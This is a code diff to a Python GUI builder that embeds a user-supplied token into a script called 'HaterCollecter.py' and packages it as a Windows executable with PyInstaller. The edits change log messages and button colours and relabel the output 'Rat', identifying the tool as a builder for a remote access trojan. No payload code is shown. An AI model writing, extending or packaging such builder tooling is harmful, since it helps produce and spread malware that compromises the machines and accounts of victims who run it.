@@ -17,7 +17,7 @@ def save_token_to_config(token):
         # Create config.json and write the token
         with open('config.json', 'w') as config_file:
             json.dump(config_data, config_file, indent=4)
-        log_message("Token saved in config.json successfully!")
+        log_message("[+] Token saved in config.json successfully!")
     except Exception as e:
         log_message(f"Failed to save token: {e}")
         messagebox.showerror("Error", f"Failed to save token: {e}")
@@ -41,7 +41,7 @@ def update_hatercollector_script(token):
         with open('HaterCollecter.py', 'w') as file:
             file.writelines(lines)
         
-        log_message("HaterCollecter.py updated with the new token.")
+        log_message("[+] HaterCollecter.py updated with the new token.")
     except Exception as e:
         log_message(f"Failed to update HaterCollecter.py: {e}")
         messagebox.showerror("Error", f"Failed to update HaterCollecter.py: {e}")
@@ -50,7 +50,7 @@ def update_hatercollector_script(token):
 def build_exe():
     try:
         # Log the build process
-        log_message("Starting the build process...")
+        log_message("[+] Starting the build process...")
         
         # Call PyInstaller to build HaterCollecter.py
         PyInstaller.__main__.run([
@@ -61,8 +61,8 @@ def build_exe():
             '--distpath', 'dist'  # Hardcoded output directory
         ])
         
-        log_message("Build completed! EXE created in 'dist' folder.")
-        messagebox.showinfo("Success", "Build completed! EXE created in 'dist' folder.")
+        log_message("[+] Build completed! Rat created in 'dist' folder.")
+        messagebox.showinfo("Success", "Build completed! Rat created in 'dist' folder.")
     except Exception as e:
         log_message(f"An error occurred during the build: {e}")
         messagebox.showerror("Error", f"An error occurred during the build: {e}")
@@ -119,7 +119,7 @@ token_entry.pack(pady=10)
 
 # Build button to trigger the build process & You can also change the color of the button
 build_button = ctk.CTkButton(master=frame, text="Build", command=start_build, width=200, height=40, 
-                             font=("Arial", 12, "bold"), fg_color="green", hover_color="darkgreen")
+                             font=("Arial", 12, "bold"), fg_color="#DE3163", hover_color="#DE3163")
 build_button.pack(pady=10)
 
 # Log View - Readonly Textbox
